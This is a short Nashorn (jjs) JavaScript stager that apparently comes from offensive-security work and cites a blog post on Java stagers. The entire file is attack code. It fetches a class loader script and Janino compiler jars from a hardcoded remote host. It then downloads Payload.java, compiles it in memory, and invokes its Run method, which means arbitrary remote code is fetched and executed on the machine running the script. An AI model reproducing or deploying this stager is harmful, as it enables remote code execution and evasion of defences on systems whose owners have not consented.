// jjs classloader 
// https://cornerpirate.com/2018/08/28/java-stager-without-the-stager/

var host = "http://192.168.154.200:8000"
load(host + "/NnClassLoader.js")

var NnClassLoader = new NnClassLoader({
  urls: [host + '/janino-3.0.8.jar', host + '/commons-compiler-3.0.8.jar']
})

var SimpleCompiler    = NnClassLoader.type("org.codehaus.janino.SimpleCompiler");
var BufferedReader    = Java.type("java.io.BufferedReader")
var InputStreamReader = Java.type("java.io.InputStreamReader")
var StringReader      = Java.type("java.io.StringReader")
var StringBuffer      = Java.type("java.lang.StringBuffer")
var Method            = Java.type("java.lang.reflect.Method")
var URL               = Java.type("java.net.URL")
var URLConnection     = Java.type("java.net.URLConnection")

function load_code()
{
    var payloadURL  = new URL(host + "/Payload.java")
    var conn        = payloadURL.openConnection()
    var reader      = new InputStreamReader(conn.getInputStream())
    var compiler    = new SimpleCompiler(null, reader)
    
    var compiled = compiler.getClassLoader().loadClass("Payload");
    compiled.getMethod("Run").invoke(null);
}

load_code()

